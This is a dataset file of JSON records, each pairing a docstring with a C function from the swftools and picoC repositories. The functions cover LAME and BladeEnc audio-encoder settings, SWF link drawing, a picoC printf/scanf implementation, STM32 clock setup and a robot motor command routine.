{"docstring": "/* number of channels in input stream */\n", "func_signal": "int\nlame_set_num_channels( lame_global_flags*  gfp,\n                       int                 num_channels )", "code": "{\n    /* default = 2 */\n\n    if ( 2 < num_channels || 0 == num_channels )\n        return -1;    /* we don't support more than 2 channels */\n\n    gfp->num_channels = num_channels;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/*void swfoutput_drawlink(gfxdevice_t*dev, char*url, gfxline_t*points)\n{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    dev->drawlink(dev, points, url);\n}*/\n", "func_signal": "void swf_drawlink(gfxdevice_t*dev, gfxline_t*points, const char*url, const char*text)", "code": "{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n\n    if(i->config_disablelinks)\n        return;\n\n    if(!strncmp(\"http://pdf2swf:\", url, 15)) {\n\tchar*tmp = strdup(url);\n\tint l = strlen(tmp);\n\tif(tmp[l-1] == '/')\n\t   tmp[l-1] = 0;\n\tswfoutput_namedlink(dev, tmp+15, points);\n\tfree(tmp);\n\treturn;\n    } else if(!strncmp(\"page\", url, 4)) {\n\tint t, nodigit=0;\n\tfor(t=4;url[t];t++)\n\t    if(url[t]<'0' || url[t]>'9')\n\t\tnodigit = 1;\n\tif(!nodigit) {\n\t    int page = atoi(&url[4]);\n\t    if(page<0) page = 0;\n\t    swfoutput_linktopage(dev, page, points);\n\t}\n    } else {\n\tswfoutput_linktourl(dev, url, points);\n    }\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "//#define ROUND_UP 19\n//#define ROUND_UP 10\n", "func_signal": "static void swfoutput_setlinewidth(gfxdevice_t*dev, double _linewidth)", "code": "{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    if(i->linewidth == (U16)(_linewidth*20+19.0/20.0))\n        return;\n    if(i->shapeid>=0)\n\tendshape(dev);\n    i->linewidth = (U16)(_linewidth*20+19.0/20.0);\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* Disable ATH. */\n", "func_signal": "int\nlame_set_noATH( lame_global_flags*  gfp,\n                int                 noATH )", "code": "{\n    gfp->noATH = noATH;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* encode a Vorbis .ogg file */\n", "func_signal": "int\nlame_set_ogg( lame_global_flags*  gfp,\n              int                 ogg )", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if ( 0 > ogg || 1 < ogg )\n        return -1;\n\n    gfp->ogg = ogg;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* Disable the bit reservoir. For testing only. */\n", "func_signal": "int\nlame_set_disable_reservoir( lame_global_flags*  gfp,\n                            int                 disable_reservoir )", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if ( 0 > disable_reservoir || 1 < disable_reservoir )\n        return -1;\n\n    gfp->disable_reservoir = disable_reservoir;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* Us a M/S mode with a switching threshold based on compression ratio */\n", "func_signal": "int\nlame_set_mode_automs( lame_global_flags*  gfp,\n                      int                 mode_automs )", "code": "{\n    /* default = 0 (disabled) */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if ( 0 > mode_automs || 1 < mode_automs )\n        return -1;\n\n    gfp->mode_automs = mode_automs;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* write a Xing VBR header frame */\n", "func_signal": "int\nlame_set_bWriteVbrTag( lame_global_flags*  gfp,\n                       int bWriteVbrTag )", "code": "{\n    /* default = 1 (on) for VBR/ABR modes, 0 (off) for CBR mode */\n\n    /* enforce disable/enable meaning, if we need more than two values\n       we need to switch to an enum to have an apropriate representation\n       of the possible meanings of the value */\n    if ( 0 > bWriteVbrTag || 1 < bWriteVbrTag )\n        return -1;\n\n    gfp->bWriteVbrTag = bWriteVbrTag;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* scale the input by this amount before encoding (not used for decoding) */\n", "func_signal": "int\nlame_set_scale( lame_global_flags*  gfp,\n                float               scale )", "code": "{\n    /* default = 0 */\n    gfp->scale = scale;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* Select the loudness approximation used by the ATH adaptive auto-leveling. */\n", "func_signal": "int\nlame_set_athaa_loudapprox( lame_global_flags*  gfp,\n                           int                 athaa_loudapprox )", "code": "{\n    gfp->athaa_loudapprox = athaa_loudapprox;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/*\n\tResvMaxBits:\n\tCalled at the beginning of each granule to get the max bit\n\tallowance for the current granule based on reservoir size\n\tand perceptual entropy.\n*/\n", "func_signal": "int\t\t\t\t\t\tResvMaxBits\n(\n\tframe_params\t\t\t*fr_ps,\n\tIII_side_info_t\t\t\t*l3_side,\n\tdouble\t\t\t\t\t*pe,\n\tint\t\t\t\t\t\tmean_bits\n)", "code": "{\n\tint\t\t\t\t\t\tmore_bits, max_bits, add_bits, over_bits;\n\n\n\tmean_bits /= fr_ps->stereo;\n\n\tmax_bits = mean_bits;\n\n\tif (ResvMax != 0)\n\t{\n\t\tmore_bits = (int) (*pe * 3.1 - mean_bits);\n\n\t\tif (more_bits > 100)\n\t\t{\n\t\t\tint\t\tfrac = (ResvSize * 6) / 10;\n\n\t\t\tadd_bits = MIN(frac, more_bits);\n\t\t}\n\t\telse\n\t\t\tadd_bits = 0;\n\n\t\tover_bits = ResvSize - ((ResvMax * 8) / 10) - add_bits;\n \t\tif (over_bits > 0)\n\t\t\tadd_bits += over_bits;\n\n\t\tmax_bits += add_bits;\n\t}\n\n\tif (max_bits > 4095)\n\t\tmax_bits = 4095;\n\n\treturn max_bits;\n}", "path": "lib\\bladeenc\\reservoir.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/*\n * Width of transition band (in Hz).\n *  default = one polyphase filter band\n */\n", "func_signal": "int\nlame_set_lowpasswidth( lame_global_flags*  gfp,\n                       int                 lowpasswidth )", "code": "{\n    gfp->lowpasswidth = lowpasswidth;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* output a single character to either a FILE * or a string */\n", "func_signal": "void StdioOutPutc(int OutCh, StdOutStream *Stream)", "code": "{\n    if (Stream->FilePtr != NULL)\n    {\n        /* output to stdio stream */\n        putc(OutCh, Stream->FilePtr);\n        Stream->CharCount++;\n    }\n    else if (Stream->StrOutLen < 0 || Stream->StrOutLen > 1)\n    {\n        /* output to a string */\n        *Stream->StrOutPtr = OutCh;\n        Stream->StrOutPtr++;\n        \n        if (Stream->StrOutLen > 1)\n            Stream->StrOutLen--;\n\n        Stream->CharCount++;\n    }\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Configures the System clock frequency, HCLK, PCLK2 and PCLK1 prescalers.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClock(void)", "code": "{\n#ifdef SYSCLK_FREQ_HSE\n  SetSysClockToHSE();\n#elif defined SYSCLK_FREQ_24MHz\n  SetSysClockTo24();\n#elif defined SYSCLK_FREQ_36MHz\n  SetSysClockTo36();\n#elif defined SYSCLK_FREQ_48MHz\n  SetSysClockTo48();\n#elif defined SYSCLK_FREQ_56MHz\n  SetSysClockTo56();  \n#elif defined SYSCLK_FREQ_72MHz\n  SetSysClockTo72();\n#endif\n \n /* If none of the define above is enabled, the HSI is used as System clock\n    source (default after reset) */ \n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Sets System clock frequency to 24MHz and configure HCLK, PCLK2 \n  *         and PCLK1 prescalers.\n  * @note   This function should be used only after reset.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClockTo24(void)", "code": "{\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* SYSCLK, HCLK, PCLK2 and PCLK1 configuration ---------------------------*/    \n  /* Enable HSE */    \n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;  \n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }  \n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n#if !defined STM32F10X_LD_VL && !defined STM32F10X_MD_VL && !defined STM32F10X_HD_VL \n    /* Enable Prefetch Buffer */\n    FLASH->ACR |= FLASH_ACR_PRFTBE;\n\n    /* Flash 0 wait state */\n    FLASH->ACR &= (uint32_t)((uint32_t)~FLASH_ACR_LATENCY);\n    FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_0;    \n#endif\n \n    /* HCLK = SYSCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE2_DIV1;\n    \n    /* PCLK1 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE1_DIV1;\n    \n#ifdef STM32F10X_CL\n    /* Configure PLLs ------------------------------------------------------*/\n    /* PLL configuration: PLLCLK = PREDIV1 * 6 = 24 MHz */ \n    RCC->CFGR &= (uint32_t)~(RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLSRC | RCC_CFGR_PLLMULL);\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLXTPRE_PREDIV1 | RCC_CFGR_PLLSRC_PREDIV1 | \n                            RCC_CFGR_PLLMULL6); \n\n    /* PLL2 configuration: PLL2CLK = (HSE / 5) * 8 = 40 MHz */\n    /* PREDIV1 configuration: PREDIV1CLK = PLL2 / 10 = 4 MHz */       \n    RCC->CFGR2 &= (uint32_t)~(RCC_CFGR2_PREDIV2 | RCC_CFGR2_PLL2MUL |\n                              RCC_CFGR2_PREDIV1 | RCC_CFGR2_PREDIV1SRC);\n    RCC->CFGR2 |= (uint32_t)(RCC_CFGR2_PREDIV2_DIV5 | RCC_CFGR2_PLL2MUL8 |\n                             RCC_CFGR2_PREDIV1SRC_PLL2 | RCC_CFGR2_PREDIV1_DIV10);\n  \n    /* Enable PLL2 */\n    RCC->CR |= RCC_CR_PLL2ON;\n    /* Wait till PLL2 is ready */\n    while((RCC->CR & RCC_CR_PLL2RDY) == 0)\n    {\n    }   \n#elif defined (STM32F10X_LD_VL) || defined (STM32F10X_MD_VL) || defined (STM32F10X_HD_VL)\n    /*  PLL configuration:  = (HSE / 2) * 6 = 24 MHz */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_PLLSRC | RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLMULL));\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLSRC_PREDIV1 | RCC_CFGR_PLLXTPRE_PREDIV1_Div2 | RCC_CFGR_PLLMULL6);\n#else    \n    /*  PLL configuration:  = (HSE / 2) * 6 = 24 MHz */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_PLLSRC | RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLMULL));\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLSRC_HSE | RCC_CFGR_PLLXTPRE_HSE_Div2 | RCC_CFGR_PLLMULL6);\n#endif /* STM32F10X_CL */\n\n    /* Enable PLL */\n    RCC->CR |= RCC_CR_PLLON;\n\n    /* Wait till PLL is ready */\n    while((RCC->CR & RCC_CR_PLLRDY) == 0)\n    {\n    }\n\n    /* Select PLL as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= (uint32_t)RCC_CFGR_SW_PLL;    \n\n    /* Wait till PLL is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS) != (uint32_t)0x08)\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock \n         configuration. User can add here some code to deal with this error */\n  } \n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* output a string to either a FILE * or a string */\n", "func_signal": "void StdioOutPuts(const char *Str, StdOutStream *Stream)", "code": "{\n    if (Stream->FilePtr != NULL)\n    {\n        /* output to stdio stream */\n        fputs(Str, Stream->FilePtr);\n    }\n    else\n    {\n        /* output to a string */\n        while (*Str != '\\0')\n        {\n            if (Stream->StrOutLen < 0 || Stream->StrOutLen > 1)\n            {\n                /* output to a string */\n                *Stream->StrOutPtr = *Str;\n                Str++;\n                Stream->StrOutPtr++;\n                \n                if (Stream->StrOutLen > 1)\n                    Stream->StrOutLen--;\n        \n                Stream->CharCount++;\n            }            \n        }\n    }\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* printf-style format of an int or other word-sized object */\n", "func_signal": "void StdioFprintfWord(StdOutStream *Stream, const char *Format, unsigned int Value)", "code": "{\n    if (Stream->FilePtr != NULL)\n        Stream->CharCount += fprintf(Stream->FilePtr, Format, Value);\n    \n    else if (Stream->StrOutLen >= 0)\n    {\n#ifndef WIN32\n\t\tint CCount = snprintf(Stream->StrOutPtr, Stream->StrOutLen, Format, Value);\n#else\n\t\tint CCount = _snprintf(Stream->StrOutPtr, Stream->StrOutLen, Format, Value);\n#endif\n\t\tStream->StrOutPtr += CCount;\n        Stream->StrOutLen -= CCount;\n        Stream->CharCount += CCount;\n    }\n    else\n    {\n        int CCount = sprintf(Stream->StrOutPtr, Format, Value);\n        Stream->CharCount += CCount;\n        Stream->StrOutPtr += CCount;\n    }\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* motor control for SRV-4WD controller */\n", "func_signal": "void Cmotorx(struct ParseState *Parser, struct Value *ReturnValue, struct Value **Param, int NumArgs)", "code": "{\n    unsigned char ch;\n    int ls, rs;\n    \n    ls = Param[0]->Val->Integer;\n    if ((ls < -100) || (ls > 100))\n        ProgramFail(NULL, \"motors():  left motor value out of range\");\n    ls = (ls * 127) / 100;  // scale to full +/-127 range\n    rs = Param[1]->Val->Integer;\n    if ((rs < -100) || (rs > 100))\n        ProgramFail(NULL, \"motors():  right motor value out of range\");\n    rs = (rs * 127) / 100;  // scale to full +/-127 range\n    if (xwd_init == 0) {\n        xwd_init = 1;\n        init_uart1(115200);\n        delayMS(10);\n    }\n    uart1SendChar('x');\n    uart1SendChar((char)ls);\n    uart1SendChar((char)rs);\n    while (uart1GetChar(&ch))  // flush the receive buffer\n        continue;\n}", "path": "platform\\library_surveyor.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* internal do-anything v[s][n]printf() formatting system with output to strings or FILE * */\n", "func_signal": "int StdioBasePrintf(struct ParseState *Parser, FILE *Stream, char *StrOut, int StrOutLen, char *Format, struct StdVararg *Args)", "code": "{\n    struct Value *ThisArg = Args->Param[0];\n    int ArgCount = 0;\n    char *FPos;\n    char OneFormatBuf[MAX_FORMAT+1];\n    int OneFormatCount;\n    struct ValueType *ShowType;\n    StdOutStream SOStream;\n    Picoc *pc = Parser->pc;\n\n    if (Format == NULL)\n        Format = \"[null format]\\n\";\n\n    FPos = Format;    \n    SOStream.FilePtr = Stream;\n    SOStream.StrOutPtr = StrOut;\n    SOStream.StrOutLen = StrOutLen;\n    SOStream.CharCount = 0;\n\n    while (*FPos != '\\0')\n    {\n        if (*FPos == '%')\n        {\n            /* work out what type we're printing */\n            FPos++;\n            ShowType = NULL;\n            OneFormatBuf[0] = '%';\n            OneFormatCount = 1;\n\n            do\n            {\n                switch (*FPos)\n                {\n                    case 'd': case 'i':     ShowType = &pc->IntType; break;     /* integer decimal */\n                    case 'o': case 'u': case 'x': case 'X': ShowType = &pc->IntType; break; /* integer base conversions */\n#ifndef NO_FP\n                    case 'e': case 'E':     ShowType = &pc->FPType; break;      /* double, exponent form */\n                    case 'f': case 'F':     ShowType = &pc->FPType; break;      /* double, fixed-point */\n                    case 'g': case 'G':     ShowType = &pc->FPType; break;      /* double, flexible format */\n#endif\n                    case 'a': case 'A':     ShowType = &pc->IntType; break;     /* hexadecimal, 0x- format */\n                    case 'c':               ShowType = &pc->IntType; break;     /* character */\n                    case 's':               ShowType = pc->CharPtrType; break;  /* string */\n                    case 'p':               ShowType = pc->VoidPtrType; break;  /* pointer */\n                    case 'n':               ShowType = &pc->VoidType; break;    /* number of characters written */\n                    case 'm':               ShowType = &pc->VoidType; break;    /* strerror(errno) */\n                    case '%':               ShowType = &pc->VoidType; break;    /* just a '%' character */\n                    case '\\0':              ShowType = &pc->VoidType; break;    /* end of format string */\n                }\n                \n                /* copy one character of format across to the OneFormatBuf */\n                OneFormatBuf[OneFormatCount] = *FPos;\n                OneFormatCount++;\n\n                /* do special actions depending on the conversion type */\n                if (ShowType == &pc->VoidType)\n                {\n                    switch (*FPos)\n                    {\n                        case 'm':   StdioOutPuts(strerror(errno), &SOStream); break;\n                        case '%':   StdioOutPutc(*FPos, &SOStream); break;\n                        case '\\0':  OneFormatBuf[OneFormatCount] = '\\0'; StdioOutPutc(*FPos, &SOStream); break;\n                        case 'n':   \n                            ThisArg = (struct Value *)((char *)ThisArg + MEM_ALIGN(sizeof(struct Value) + TypeStackSizeValue(ThisArg)));\n                            if (ThisArg->Typ->Base == TypeArray && ThisArg->Typ->FromType->Base == TypeInt)\n                                *(int *)ThisArg->Val->Pointer = SOStream.CharCount;\n                            break;\n                    }\n                }\n\n                FPos++;\n\n            } while (ShowType == NULL && OneFormatCount < MAX_FORMAT);\n\n            if (ShowType != &pc->VoidType)\n            {\n                if (ArgCount >= Args->NumArgs)\n                    StdioOutPuts(\"XXX\", &SOStream);\n                else\n                {\n                    /* null-terminate the buffer */\n                    OneFormatBuf[OneFormatCount] = '\\0';\n    \n                    /* print this argument */\n                    ThisArg = (struct Value *)((char *)ThisArg + MEM_ALIGN(sizeof(struct Value) + TypeStackSizeValue(ThisArg)));\n                    if (ShowType == &pc->IntType)\n                    {\n                        /* show a signed integer */\n                        if (IS_NUMERIC_COERCIBLE(ThisArg))\n                            StdioFprintfWord(&SOStream, OneFormatBuf, ExpressionCoerceUnsignedInteger(ThisArg));\n                        else\n                            StdioOutPuts(\"XXX\", &SOStream);\n                    }\n#ifndef NO_FP\n                    else if (ShowType == &pc->FPType)\n                    {\n                        /* show a floating point number */\n                        if (IS_NUMERIC_COERCIBLE(ThisArg))\n                            StdioFprintfFP(&SOStream, OneFormatBuf, ExpressionCoerceFP(ThisArg));\n                        else\n                            StdioOutPuts(\"XXX\", &SOStream);\n                    }                    \n#endif\n                    else if (ShowType == pc->CharPtrType)\n                    {\n                        if (ThisArg->Typ->Base == TypePointer)\n                            StdioFprintfPointer(&SOStream, OneFormatBuf, ThisArg->Val->Pointer);\n                            \n                        else if (ThisArg->Typ->Base == TypeArray && ThisArg->Typ->FromType->Base == TypeChar)\n                            StdioFprintfPointer(&SOStream, OneFormatBuf, &ThisArg->Val->ArrayMem[0]);\n                            \n                        else\n                            StdioOutPuts(\"XXX\", &SOStream);\n                    }\n                    else if (ShowType == pc->VoidPtrType)\n                    {\n                        if (ThisArg->Typ->Base == TypePointer)\n                            StdioFprintfPointer(&SOStream, OneFormatBuf, ThisArg->Val->Pointer);\n                            \n                        else if (ThisArg->Typ->Base == TypeArray)\n                            StdioFprintfPointer(&SOStream, OneFormatBuf, &ThisArg->Val->ArrayMem[0]);\n                            \n                        else\n                            StdioOutPuts(\"XXX\", &SOStream);\n                    }\n\n                    ArgCount++;\n                }\n            }\n        }\n        else\n        {\n            /* just output a normal character */\n            StdioOutPutc(*FPos, &SOStream);\n            FPos++;\n        }\n    }\n    \n    /* null-terminate */\n    if (SOStream.StrOutPtr != NULL && SOStream.StrOutLen > 0)\n        *SOStream.StrOutPtr = '\\0';      \n    \n    return SOStream.CharCount;\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* internal do-anything v[s][n]scanf() formatting system with input from strings or FILE * */\n", "func_signal": "int StdioBaseScanf(struct ParseState *Parser, FILE *Stream, char *StrIn, char *Format, struct StdVararg *Args)", "code": "{\n    struct Value *ThisArg = Args->Param[0];\n    int ArgCount = 0;\n    void *ScanfArg[MAX_SCANF_ARGS];\n    \n    if (Args->NumArgs > MAX_SCANF_ARGS)\n        ProgramFail(Parser, \"too many arguments to scanf() - %d max\", MAX_SCANF_ARGS);\n    \n    for (ArgCount = 0; ArgCount < Args->NumArgs; ArgCount++)\n    {\n        ThisArg = (struct Value *)((char *)ThisArg + MEM_ALIGN(sizeof(struct Value) + TypeStackSizeValue(ThisArg)));\n        \n        if (ThisArg->Typ->Base == TypePointer) \n            ScanfArg[ArgCount] = ThisArg->Val->Pointer;\n        \n        else if (ThisArg->Typ->Base == TypeArray)\n            ScanfArg[ArgCount] = &ThisArg->Val->ArrayMem[0];\n        \n        else\n            ProgramFail(Parser, \"non-pointer argument to scanf() - argument %d after format\", ArgCount+1);\n    }\n    \n    if (Stream != NULL)\n        return fscanf(Stream, Format, ScanfArg[0], ScanfArg[1], ScanfArg[2], ScanfArg[3], ScanfArg[4], ScanfArg[5], ScanfArg[6], ScanfArg[7], ScanfArg[8], ScanfArg[9]);\n    else\n        return sscanf(StrIn, Format, ScanfArg[0], ScanfArg[1], ScanfArg[2], ScanfArg[3], ScanfArg[4], ScanfArg[5], ScanfArg[6], ScanfArg[7], ScanfArg[8], ScanfArg[9]);\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/**\n  * @brief  Sets System clock frequency to 56MHz and configure HCLK, PCLK2 \n  *         and PCLK1 prescalers. \n  * @note   This function should be used only after reset.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClockTo56(void)", "code": "{\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* SYSCLK, HCLK, PCLK2 and PCLK1 configuration ---------------------------*/   \n  /* Enable HSE */    \n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;  \n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }  \n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n    /* Enable Prefetch Buffer */\n    FLASH->ACR |= FLASH_ACR_PRFTBE;\n\n    /* Flash 2 wait state */\n    FLASH->ACR &= (uint32_t)((uint32_t)~FLASH_ACR_LATENCY);\n    FLASH->ACR |= (uint32_t)FLASH_ACR_LATENCY_2;    \n \n    /* HCLK = SYSCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE2_DIV1;\n    \n    /* PCLK1 = HCLK */\n    RCC->CFGR |= (uint32_t)RCC_CFGR_PPRE1_DIV2;\n\n#ifdef STM32F10X_CL\n    /* Configure PLLs ------------------------------------------------------*/\n    /* PLL2 configuration: PLL2CLK = (HSE / 5) * 8 = 40 MHz */\n    /* PREDIV1 configuration: PREDIV1CLK = PLL2 / 5 = 8 MHz */\n        \n    RCC->CFGR2 &= (uint32_t)~(RCC_CFGR2_PREDIV2 | RCC_CFGR2_PLL2MUL |\n                              RCC_CFGR2_PREDIV1 | RCC_CFGR2_PREDIV1SRC);\n    RCC->CFGR2 |= (uint32_t)(RCC_CFGR2_PREDIV2_DIV5 | RCC_CFGR2_PLL2MUL8 |\n                             RCC_CFGR2_PREDIV1SRC_PLL2 | RCC_CFGR2_PREDIV1_DIV5);\n  \n    /* Enable PLL2 */\n    RCC->CR |= RCC_CR_PLL2ON;\n    /* Wait till PLL2 is ready */\n    while((RCC->CR & RCC_CR_PLL2RDY) == 0)\n    {\n    }\n    \n   \n    /* PLL configuration: PLLCLK = PREDIV1 * 7 = 56 MHz */ \n    RCC->CFGR &= (uint32_t)~(RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLSRC | RCC_CFGR_PLLMULL);\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLXTPRE_PREDIV1 | RCC_CFGR_PLLSRC_PREDIV1 | \n                            RCC_CFGR_PLLMULL7); \n#else     \n    /* PLL configuration: PLLCLK = HSE * 7 = 56 MHz */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_PLLSRC | RCC_CFGR_PLLXTPRE | RCC_CFGR_PLLMULL));\n    RCC->CFGR |= (uint32_t)(RCC_CFGR_PLLSRC_HSE | RCC_CFGR_PLLMULL7);\n\n#endif /* STM32F10X_CL */\n\n    /* Enable PLL */\n    RCC->CR |= RCC_CR_PLLON;\n\n    /* Wait till PLL is ready */\n    while((RCC->CR & RCC_CR_PLLRDY) == 0)\n    {\n    }\n\n    /* Select PLL as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= (uint32_t)RCC_CFGR_SW_PLL;    \n\n    /* Wait till PLL is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS) != (uint32_t)0x08)\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock \n         configuration. User can add here some code to deal with this error */\n  } \n}", "path": "ports\\STM32\\system_stm32f10x.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* initialises the I/O system so error reporting works */\n", "func_signal": "void BasicIOInit(Picoc *pc)", "code": "{\n    pc->CStdOut = stdout;\n    stdinValue = stdin;\n    stdoutValue = stdout;\n    stderrValue = stderr;\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
{"docstring": "/* printf-style format of a floating point number */\n", "func_signal": "void StdioFprintfFP(StdOutStream *Stream, const char *Format, double Value)", "code": "{\n    if (Stream->FilePtr != NULL)\n        Stream->CharCount += fprintf(Stream->FilePtr, Format, Value);\n    \n    else if (Stream->StrOutLen >= 0)\n    {\n#ifndef WIN32\n        int CCount = snprintf(Stream->StrOutPtr, Stream->StrOutLen, Format, Value);\n#else\n        int CCount = _snprintf(Stream->StrOutPtr, Stream->StrOutLen, Format, Value);\n#endif\n\t\tStream->StrOutPtr += CCount;\n        Stream->StrOutLen -= CCount;\n        Stream->CharCount += CCount;\n    }\n    else\n    {\n        int CCount = sprintf(Stream->StrOutPtr, Format, Value);\n        Stream->CharCount += CCount;\n        Stream->StrOutPtr += CCount;\n    }\n}", "path": "cstdlib\\stdio.c", "repo_name": "x893/picoC", "stars": 38, "license": "None", "language": "c", "size": 2947}
